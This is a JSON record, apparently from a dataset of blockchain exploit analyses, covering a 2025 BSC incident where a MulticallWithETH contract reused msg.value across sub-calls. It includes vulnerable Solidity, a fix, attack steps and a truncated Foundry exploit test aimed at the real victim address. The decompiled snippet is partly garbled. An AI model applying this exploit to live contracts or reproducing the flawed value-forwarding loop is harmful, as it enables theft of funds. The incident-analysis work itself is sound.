@@ -1,0 +1,35 @@
+{
+ "id": "2025__2025-07-22_MulticallWithETH_ValueForwarding",
+ "source_file": "2025/2025-07-22_MulticallWithETH_ValueForwarding.md",
+ "title": "MulticallWithETH — ETH Value Forwarding Bug Analysis",
+ "date": "2025-07-22",
+ "protocol": "MulticallWithETH",
+ "chain": "BSC",
+ "loss_raw": "~10,000 USDT",
+ "loss_usd": null,
+ "root_cause": "The Multicall contract repeatedly reuses `msg.value` across each sub-call, enabling ETH double-spending",
+ "attack_tx": "0x6da7be6e",
+ "vulnerable_contract": "0x3da0f00d5c4e544924bc7282e18497c4a4c92046",
+ "classes": [
+  "arbitrary-call"
+ ],
+ "code_before": [
+  "❌ Vulnerable logic: msg.value is reused for each call\ncontract MulticallWithETH {\n    struct Call {\n        address target;\n        bytes callData;\n        uint256 value;\n        bool allowFailure;\n    }\n\n    function aggregate(Call[] calldata calls) external payable returns (bytes[] memory results) {\n        results = new bytes[](calls.length);\n        for (uint256 i = 0; i < calls.length; i++) {\n            //",
+  "❌ Full msg.value used for each call — ETH double-spend\n            (bool success, bytes memory result) = calls[i].target.call{\n                value: calls[i].value  // calls[i].value is never deducted from msg.value\n            }(calls[i].callData);\n            ...\n        }\n    }\n}\n\n//",
+  "// File: MulticallWithETH_decompiled.sol\ncontract MulticallWithETH {\ncontract MulticallWithETH {  // ❌ Vulnerability\n\n    // Selector: 0x4e487b71\n    function Panic(uint256 a) external {\n        // TODO: decompile logic not implemented\n    }\n\n    // Selector: 0x2d2ae1c1\n    function getBalances(address[] a) external view returns (uint256) {\n        // TODO: decompile logic not implemented\n    }\n\n}"
+ ],
+ "code_after": [
+  "✅ Fix: track total ETH consumed and validate\nfunction aggregate(Call[] calldata calls) external payable returns (bytes[] memory results) {\n    uint256 totalValue = 0;\n    for (uint256 i = 0; i < calls.length; i++) {\n        totalValue += calls[i].value;\n    }\n    require(totalValue == msg.value, \"ETH value mismatch\");\n    // Then forward only the corresponding value to each call\n}"
+ ],
+ "steps": [
+  "1 ▶ MulticallWithETH.aggregate([call1, call2, call3, ...])",
+  "2 ▶ Internal: call1{value: 1 BNB} → victim contract payment",
+  "3 ▶ Internal: call2{value: 1 BNB} → same BNB reused",
+  "4 ▶ Internal: call3~N {value: 1 BNB} → repeated reuse",
+  "5 ▶ N×1 BNB worth of payments completed with just 1 BNB → ~10,000 USDT drained"
+ ],
+ "other_code": [
+  "Attacker\n  │\n  ├─1─▶ MulticallWithETH.aggregate([call1, call2, call3, ...])\n  │         └─ msg.value = 1 BNB sent\n  │\n  ├─2─▶ Internal: call1{value: 1 BNB} → victim contract payment\n  │\n  ├─3─▶ Internal: call2{value: 1 BNB} → same BNB reused\n  │         └─ same value forwarded again without deducting ETH balance\n  │\n  ├─4─▶ Internal: call3~N {value: 1 BNB} → repeated reuse\n  │\n  └─5─▶ N×1 BNB worth of payments completed with just 1 BNB → ~10,000 USDT drained",
+  "contract MulticallWithETH is Test {\n    address USDC = 0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d;\n    address victim = 0x3DA0F00d5c4E544924bC7282E18497C4A4c92046;\n\n    struct Call {\n        address target;\n        bytes callData;\n        uint256 value;\n        bool allowFailure;\n    }\n\n    function testExploit() public {\n        vm.createSelectFork(\"bsc\", 55371342);\n\n        // Build calls array that reuses the same value repeatedly\n        uint256 repeatCount = 10; // Reuse 1 BNB 10 times\n        Call[] memory calls = new Call[](repeatCount);\n\n        for (uint256 i = 0; i < repeatCount; i++) {\n            calls[i] = Call({\n                target: address(victimContract),\n                // Function that purchases USDT with ETH payment from victim contract\n                callData: abi.e"
+ ]
+}
